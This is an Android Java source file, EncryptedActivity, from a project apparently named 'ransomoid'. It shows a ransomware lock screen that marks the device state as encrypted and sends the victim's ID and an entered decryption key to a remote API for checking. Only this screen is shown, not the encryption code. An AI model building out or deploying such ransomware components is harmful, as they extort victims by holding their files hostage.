package falezza.fabio.ransomoid.activities;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.EditText;

import org.json.JSONException;

import falezza.fabio.ransomoid.AppState;
import falezza.fabio.ransomoid.R;
import falezza.fabio.ransomoid.utils.Api;
import falezza.fabio.ransomoid.utils.AppDelegate;

public class EncryptedActivity extends AppCompatActivity {

    private EditText etKey;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_encrypted);
        this.etKey = findViewById(R.id.etKey);

        String state = AppDelegate.getInstance(this).getByTag(AppDelegate.appState);
        if (!state.equals(AppState.ENCRYPTED.toString())) {
            AppDelegate.getInstance(this).saveAppState(AppState.ENCRYPTED);
        }
    }

    public void decrypt(View view) {
        try {
            Api.getInstance(this).checkKey(
                    AppDelegate.getInstance(this).getByTag(AppDelegate.userID),
                    etKey.getText().toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
